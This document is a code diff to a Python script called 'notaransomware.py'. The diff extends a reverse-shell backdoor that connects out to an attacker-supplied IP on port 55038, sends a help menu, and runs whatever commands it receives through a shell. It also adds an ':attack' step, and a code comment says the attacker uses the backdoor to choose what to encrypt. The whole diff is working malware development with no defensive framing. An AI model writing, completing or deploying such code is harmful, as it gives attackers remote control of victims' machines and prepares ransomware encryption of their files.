@@ -60,36 +60,59 @@ def get_lan_ip_from_mid_server(middleman_ip):
 
 def setup_backdoor(lan_ip):
     global BUFFER_SIZE
+    FIRST_MSG = "\n\n"
+    FIRST_MSG += "Welcome to the backdoor for notaransomware!\n"
+    FIRST_MSG += "If, at any time, you need help, type :help\n"
     PROMPT = "\n[type :help for help]-> "
+
+    cwd = os.getcwd()
 
     s = socket.socket()
     s.connect((lan_ip, 55038))
 
     while True:
-        s.send(PROMPT.encode())
+        s.send(f"{FIRST_MSG}\n{PROMPT}".encode())
+        FIRST_MSG = ""
         msg = s.recv(BUFFER_SIZE).decode()
+        
+        if msg.strip() == ":help":
+            msg = """Custom Commands:
+            \r  :cd <dir>   - change directory
+            \r  :exit       - exit the backdoor
+            \r  :help       - show this help message
+            \r  :attack     - attack the machine
+            """
+            s.send(f"{msg}\n".encode())
+            continue
 
         if msg.strip() == ":exit":
+            cwd = None
             break
 
         if msg.startswith(":cd"):
             os.chdir(msg[3:].strip())
+            cwd = os.getcwd()
             continue
+
+        if msg.strip() == ":attack":
+            break
 
         proc = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output = proc.stdout.read() + proc.stderr.read()
         s.send(output)
     
     s.close()
-
+    return cwd
 
 def main(middleman_ip, direct_ip):
     if middleman_ip:
         lan_ip = get_lan_ip_from_mid_server(middleman_ip)
-    else
+    else:
         lan_ip = direct_ip
-    setup_backdoor(lan_ip)
-    exit()
+    cwd = setup_backdoor(lan_ip)
+
+    if not cwd:
+        exit()
 
     # setup an extremely basic backdoor here so the attacker can choose what to encrypt.
 
@@ -121,14 +144,14 @@ if __name__ == "__main__":
             skip = False
             continue
         if arg == "-m":
-            if sys.argv.count() != 3:
-                print("usage: python notaransomware.py [-m <ip of middleserver>] or [-d <ip of attack machine>]")
+            if len(sys.argv) != 3:
+                print("usage: python notaransomware.py [-m <ip of middleserver>] or <ip of attack machine>")
                 exit(1)
             else:
                 skip = True
         else:
-            if sys.argv.count() != 2:
-                print("usage: python notaransomware.py [-m <ip of middleserver>] or [-d <ip of attack machine>]")
+            if len(sys.argv) != 2:
+                print("usage: python notaransomware.py [-m <ip of middleserver>] or <ip of attack machine>")
                 exit(1)
             else:
                 direct_ip = sys.argv[1]
